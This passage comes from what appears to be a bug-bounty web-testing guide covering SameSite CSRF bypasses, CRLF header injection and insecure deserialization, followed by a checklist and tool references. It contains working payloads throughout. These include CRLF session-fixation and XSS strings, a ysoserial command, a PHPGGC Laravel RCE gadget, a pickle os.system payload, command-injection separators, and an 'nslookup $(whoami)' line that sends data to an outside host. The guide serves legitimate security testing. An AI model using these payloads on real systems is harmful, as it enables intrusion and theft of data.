+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>GET-based state change → top-level navigation allowed under Lax → still vulnerable
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>Subdomain XSS chain:
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>→ XSS on sub.target.com (same registrable domain)
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>→ SameSite doesn&#39;t apply between sub.target.com and target.com
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>→ Use XSS to send CSRF request cross-subdomain
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>2-minute cookie window (Chrome):
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>→ Newly set cookies (within 2 minutes) are sent on cross-site POST in some versions
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>→ Trigger re-authentication → new cookie → exploit window
+</span></code></pre></div>
+<hr />
+<h2 id="46-crlf-injection--header-injection">4.6 CRLF Injection &amp; Header Injection<a class="headerlink" href="#46-crlf-injection--header-injection" title="Permanent link">&para;</a></h2>
+<p><code>\r\n</code> is the HTTP line separator. User input containing <code>\r\n</code> inserted into a response header without sanitization lets an attacker inject additional headers — or split the response entirely to inject a full HTTP body.</p>
+<h3 id="461-detection-and-escalation">4.6.1 Detection and Escalation<a class="headerlink" href="#461-detection-and-escalation" title="Permanent link">&para;</a></h3>
+<p><strong>Where to probe:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>Redirect parameters: ?next=https://target.com%0d%0aHeader:injected
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>URL path: /redirect/%0d%0aSet-Cookie:evil=1
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>Any value reflected in a response header (Location, Set-Cookie, Link)
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">crlf_probe.sh</span><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Probe strings:</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>%0d%0a<span class="w">          </span><span class="c1"># URL-encoded \r\n</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>%0D%0A<span class="w">          </span><span class="c1"># uppercase</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>%0a<span class="w">             </span><span class="c1"># just LF (some servers accept)</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="c1"># Confirm injection:</span>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>curl<span class="w"> </span>-sv<span class="w"> </span><span class="s2">&quot;https://target.com/redirect?url=https://example.com%0d%0aX-Injected:yes&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="w">  </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;x-injected&quot;</span>
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="c1"># X-Injected: yes in response → CRLF confirmed</span>
+</span></code></pre></div>
+<p><strong>Escalation chain:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Injection</th>
+<th>Payload</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Header injection</td>
+<td><code>%0d%0aX-Test:injected</code></td>
+<td>Confirmed CRLF</td>
+</tr>
+<tr>
+<td>Set-Cookie injection</td>
+<td><code>%0d%0aSet-Cookie:session=attacker</code></td>
+<td>Session fixation</td>
+</tr>
+<tr>
+<td>Response splitting</td>
+<td><code>%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>XSS</td>
+</tr>
+<tr>
+<td>Content-Type + body</td>
+<td><code>%0d%0aContent-Type:text/html%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>XSS</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="47-insecure-deserialization">4.7 Insecure Deserialization<a class="headerlink" href="#47-insecure-deserialization" title="Permanent link">&para;</a></h2>
+<p>Applications serialize objects to transmit or store them. If user-controlled serialized data is deserialized without validation, an attacker can manipulate object properties or trigger gadget chains that execute arbitrary code during deserialization.</p>
+<p><strong>The detection-first rule:</strong> In bug bounty, confirming the attack surface and demonstrating the vulnerability class is sufficient for a High/Critical report. You don't need a full RCE PoC.</p>
+<h3 id="471-identifying-serialized-data">4.7.1 Identifying Serialized Data<a class="headerlink" href="#471-identifying-serialized-data" title="Permanent link">&para;</a></h3>
+<p><strong>Signatures by language:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Language</th>
+<th>Format</th>
+<th>Signature</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Java</td>
+<td>Binary</td>
+<td><code>AC ED 00 05</code> (hex) / <code>rO0AB</code> (base64)</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>Text</td>
+<td><code>O:4:"User":2:{s:4:"name";s:4:"John";}</code></td>
+</tr>
+<tr>
+<td>Python pickle</td>
+<td>Binary</td>
+<td><code>\x80\x02</code> or <code>\x80\x04</code></td>
+</tr>
+<tr>
+<td>Ruby Marshal</td>
+<td>Binary</td>
+<td><code>\x04\x08</code></td>
+</tr>
+<tr>
+<td>.NET BinaryFormatter</td>
+<td>Binary</td>
+<td><code>AAEAAAD/////</code> (base64)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Where to look:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Cookies — base64-decode all of them
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>Hidden form fields
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>API request body parameters
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>Remember-me tokens
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>Session data
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>__VIEWSTATE in .NET apps
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">detect_serialization.sh</span><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># Check cookie for Java serialization magic bytes:</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;cookie_value&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="c1"># ac ed 00 05 → Java serialization confirmed</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="c1"># PHP is plaintext after base64 decode:</span>
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;cookie_value&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="c1"># O:10:&quot;UserObject&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;John&quot;;}</span>
+</span></code></pre></div>
+<hr />
+<h3 id="472-safe-poc-by-language">4.7.2 Safe PoC by Language<a class="headerlink" href="#472-safe-poc-by-language" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="6:3"><input checked="checked" id="__tabbed_6_1" name="__tabbed_6" type="radio" /><input id="__tabbed_6_2" name="__tabbed_6" type="radio" /><input id="__tabbed_6_3" name="__tabbed_6" type="radio" /><div class="tabbed-labels"><label for="__tabbed_6_1">Java (ysoserial)</label><label for="__tabbed_6_2">PHP (PHPGGC)</label><label for="__tabbed_6_3">Python pickle</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">java_deser_poc.sh</span><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># Generate URLDNS payload — triggers DNS lookup only, no RCE, safe for live targets:</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>URLDNS<span class="w"> </span><span class="s2">&quot;http://abc123.interactsh.com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w0
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="c1"># Submit as the serialized cookie/parameter</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="c1"># Monitor interactsh for DNS callback</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="c1"># DNS callback = deserialization is occurring → report as High/Critical</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="c1"># Note available chains: CommonsCollections1-7, Spring, etc.</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">php_deser_poc.sh</span><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c1"># Property manipulation — safe, no RCE needed:</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="c1"># 1. Decode cookie: base64 -d → O:4:&quot;User&quot;:1:{s:4:&quot;role&quot;;s:4:&quot;user&quot;;}</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="c1"># 2. Modify property: change &quot;user&quot; to &quot;admin&quot;</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c1"># 3. Re-encode: php -r &#39;echo base64_encode(serialize(...));&#39;</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="c1"># 4. Submit — if behavior changes → confirmed</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="c1"># For gadget chain PoC (if program allows):</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a>phpggc<span class="w"> </span>--list<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;laravel\|symfony&quot;</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>phpggc<span class="w"> </span>Laravel/RCE1<span class="w"> </span>system<span class="w"> </span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w0
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-python highlight"><span class="filename">python_pickle_poc.py</span><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="c1"># Detect:</span>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s2">&quot;&lt;parameter_value&gt;&quot;</span><span class="p">)</span>
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="k">if</span> <span class="n">data</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x02</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x03</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x04</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x05</span><span class="s1">&#39;</span><span class="p">]:</span>
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Python pickle detected&quot;</span><span class="p">)</span>
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="c1"># Safe OOB PoC:</span>
+</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a><span class="k">class</span><span class="w"> </span><span class="nc">OOBPayload</span><span class="p">:</span>
+</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;nslookup abc123.interactsh.com&#39;</span><span class="p">,))</span>
+</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>
+</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">OOBPayload</span><span class="p">()))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a><span class="c1"># Submit, watch interactsh for DNS callback</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">DNS callback is the safe standard</p>
+<p>Never submit reverse shells or file-write payloads on production systems. DNS callback via URLDNS/nslookup confirms deserialization is occurring without any harmful side effects. Most programs accept this as sufficient evidence for High/Critical.</p>
+</div>
+<hr />
+<h2 id="part-4-complete-checklist">Part 4 Complete Checklist<a class="headerlink" href="#part-4-complete-checklist" title="Permanent link">&para;</a></h2>
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>XSS
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>□ Canary string in every input → find reflection point
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>□ URL parameters — all of them
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>□ URL hash (#) for DOM XSS source
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>□ HTTP headers reflected in response
+</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>□ File names on upload
+</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>□ Identify rendering context before choosing payload
+</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a>□ Run Dalfox on all parameterized URLs
+</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>□ Run DOM Invader while manually browsing
+</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>□ Install XSS Hunter payload in all stored fields
+</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>□ Read CSP header — analyze for bypasses
+</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>□ Escalate: cookie theft, CSRF-via-XSS, token theft from localStorage
+</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a>
+</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>SQL INJECTION
+</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a>□ Single quote in every parameter — error or behavior change?
+</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a>□ Boolean true/false conditions — response difference?
+</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>□ SLEEP() — time delay confirms blind injection
+</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a>□ Non-standard: headers, cookies, ORDER BY, JSON body
+</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a>□ Second-order: register with SQL payload, trigger via update
+</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>□ sqlmap at level=1/risk=1 (throttled, no --os-shell)
+</span><span id="__span-55-21"><a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a>□ Capture DB version + current user as PoC, stop there
+</span><span id="__span-55-22"><a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a>
+</span><span id="__span-55-23"><a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a>SSTI
+</span><span id="__span-55-24"><a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a>□ Polyglot probe in all rendered fields
+</span><span id="__span-55-25"><a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a>□ 49 in response → confirmed
+</span><span id="__span-55-26"><a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a>□ Identify engine via differentiation
+</span><span id="__span-55-27"><a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a>□ Blind SSTI: OOB via DNS before RCE attempt
+</span><span id="__span-55-28"><a id="__codelineno-55-28" name="__codelineno-55-28" href="#__codelineno-55-28"></a>□ SSTImap for automated exploitation
+</span><span id="__span-55-29"><a id="__codelineno-55-29" name="__codelineno-55-29" href="#__codelineno-55-29"></a>
+</span><span id="__span-55-30"><a id="__codelineno-55-30" name="__codelineno-55-30" href="#__codelineno-55-30"></a>COMMAND INJECTION
+</span><span id="__span-55-31"><a id="__codelineno-55-31" name="__codelineno-55-31" href="#__codelineno-55-31"></a>□ Shell separators after every input: ;id &amp;&amp;id ||id $(id) `id`
+</span><span id="__span-55-32"><a id="__codelineno-55-32" name="__codelineno-55-32" href="#__codelineno-55-32"></a>□ Blind: sleep 5 → time delay
+</span><span id="__span-55-33"><a id="__codelineno-55-33" name="__codelineno-55-33" href="#__codelineno-55-33"></a>□ Blind OOB: nslookup $(whoami).interactsh.com
+</span><span id="__span-55-34"><a id="__codelineno-55-34" name="__codelineno-55-34" href="#__codelineno-55-34"></a>□ Image/file processing (ImageMagick, ffmpeg)
+</span><span id="__span-55-35"><a id="__codelineno-55-35" name="__codelineno-55-35" href="#__codelineno-55-35"></a>□ Network utility features (ping, DNS lookup, traceroute)
+</span><span id="__span-55-36"><a id="__codelineno-55-36" name="__codelineno-55-36" href="#__codelineno-55-36"></a>□ Document generation (wkhtmltopdf, Pandoc, LaTeX)
+</span><span id="__span-55-37"><a id="__codelineno-55-37" name="__codelineno-55-37" href="#__codelineno-55-37"></a>
+</span><span id="__span-55-38"><a id="__codelineno-55-38" name="__codelineno-55-38" href="#__codelineno-55-38"></a>CSRF
+</span><span id="__span-55-39"><a id="__codelineno-55-39" name="__codelineno-55-39" href="#__codelineno-55-39"></a>□ State-changing endpoints: CSRF token present?
+</span><span id="__span-55-40"><a id="__codelineno-55-40" name="__codelineno-55-40" href="#__codelineno-55-40"></a>□ Token bypass: remove it, empty it, use own token for victim
+</span><span id="__span-55-41"><a id="__codelineno-55-41" name="__codelineno-55-41" href="#__codelineno-55-41"></a>□ SameSite cookie attribute: Strict/Lax/None?
+</span><span id="__span-55-42"><a id="__codelineno-55-42" name="__codelineno-55-42" href="#__codelineno-55-42"></a>□ GET-based state changes (vulnerable even with SameSite=Lax)
+</span><span id="__span-55-43"><a id="__codelineno-55-43" name="__codelineno-55-43" href="#__codelineno-55-43"></a>□ JSON endpoints: text/plain PoC, check form-encoded also accepted
+</span><span id="__span-55-44"><a id="__codelineno-55-44" name="__codelineno-55-44" href="#__codelineno-55-44"></a>□ Build auto-submitting PoC HTML, confirm action executes
+</span><span id="__span-55-45"><a id="__codelineno-55-45" name="__codelineno-55-45" href="#__codelineno-55-45"></a>
+</span><span id="__span-55-46"><a id="__codelineno-55-46" name="__codelineno-55-46" href="#__codelineno-55-46"></a>CRLF
+</span><span id="__span-55-47"><a id="__codelineno-55-47" name="__codelineno-55-47" href="#__codelineno-55-47"></a>□ %0d%0a in redirect/URL parameters
+</span><span id="__span-55-48"><a id="__codelineno-55-48" name="__codelineno-55-48" href="#__codelineno-55-48"></a>□ Inject X-Test header → confirm in response
+</span><span id="__span-55-49"><a id="__codelineno-55-49" name="__codelineno-55-49" href="#__codelineno-55-49"></a>□ Escalate: Set-Cookie injection → session fixation
+</span><span id="__span-55-50"><a id="__codelineno-55-50" name="__codelineno-55-50" href="#__codelineno-55-50"></a>□ Escalate: double CRLF → response splitting → XSS
+</span><span id="__span-55-51"><a id="__codelineno-55-51" name="__codelineno-55-51" href="#__codelineno-55-51"></a>
+</span><span id="__span-55-52"><a id="__codelineno-55-52" name="__codelineno-55-52" href="#__codelineno-55-52"></a>DESERIALIZATION
+</span><span id="__span-55-53"><a id="__codelineno-55-53" name="__codelineno-55-53" href="#__codelineno-55-53"></a>□ Base64-decode all cookies → check for serialization magic bytes
+</span><span id="__span-55-54"><a id="__codelineno-55-54" name="__codelineno-55-54" href="#__codelineno-55-54"></a>□ Java: AC ED 00 05 / rO0AB → ysoserial URLDNS OOB PoC
+</span><span id="__span-55-55"><a id="__codelineno-55-55" name="__codelineno-55-55" href="#__codelineno-55-55"></a>□ PHP: O:N: pattern → property manipulation PoC
+</span><span id="__span-55-56"><a id="__codelineno-55-56" name="__codelineno-55-56" href="#__codelineno-55-56"></a>□ Python: \x80\x02 → pickle OOB PoC
+</span><span id="__span-55-57"><a id="__codelineno-55-57" name="__codelineno-55-57" href="#__codelineno-55-57"></a>□ .NET: AAEAAAD → ViewState tampering
+</span><span id="__span-55-58"><a id="__codelineno-55-58" name="__codelineno-55-58" href="#__codelineno-55-58"></a>□ Hidden form fields, remember-me tokens, cache params
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg></span> <strong>PortSwigger Labs</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting">XSS (all types)</a></li>
+<li><a href="https://portswigger.net/web-security/sql-injection">SQL injection</a></li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection">SSTI</a></li>
+<li><a href="https://portswigger.net/web-security/os-command-injection">OS command injection</a></li>
+<li><a href="https://portswigger.net/web-security/csrf">CSRF</a></li>
+<li><a href="https://portswigger.net/web-security/deserialization">Deserialization</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M5.433 2.304A4.49 4.49 0 0 0 3.5 6c0 1.598.832 3.002 2.09 3.802.518.328.929.923.902 1.64v.008l-.164 3.337a.75.75 0 1 1-1.498-.073l.163-3.33c.002-.085-.05-.216-.207-.316A6 6 0 0 1 2 6a6 6 0 0 1 2.567-4.92 1.48 1.48 0 0 1 1.673-.04c.462.296.76.827.76 1.423v2.82c0 .082.041.16.11.206l.75.51a.25.25 0 0 0 .28 0l.75-.51A.25.25 0 0 0 9 5.282V2.463c0-.596.298-1.127.76-1.423a1.48 1.48 0 0 1 1.673.04A6 6 0 0 1 14 6a6 6 0 0 1-2.786 5.068c-.157.1-.209.23-.207.315l.163 3.33a.752.752 0 0 1-1.094.714.75.75 0 0 1-.404-.64l-.164-3.345c-.027-.717.384-1.312.902-1.64A4.5 4.5 0 0 0 12.5 6a4.49 4.49 0 0 0-1.933-3.696c-.024.017-.067.067-.067.16v2.818a1.75 1.75 0 0 1-.767 1.448l-.75.51a1.75 1.75 0 0 1-1.966 0l-.75-.51A1.75 1.75 0 0 1 5.5 5.282V2.463c0-.092-.043-.142-.067-.159"/></svg></span> <strong>Tools</strong></p>
+<hr />
+<ul>
+<li><a href="https://github.com/hahwul/dalfox">Dalfox</a></li>
+<li><a href="https://github.com/vladko312/SSTImap">SSTImap</a></li>
+<li><a href="https://sqlmap.org">sqlmap</a></li>
+<li><a href="https://github.com/frohoff/ysoserial">ysoserial</a></li>
+<li><a href="https://github.com/ambionics/phpggc">PHPGGC</a></li>
+<li><a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a></li>
+</ul>
+</li>
+<li>
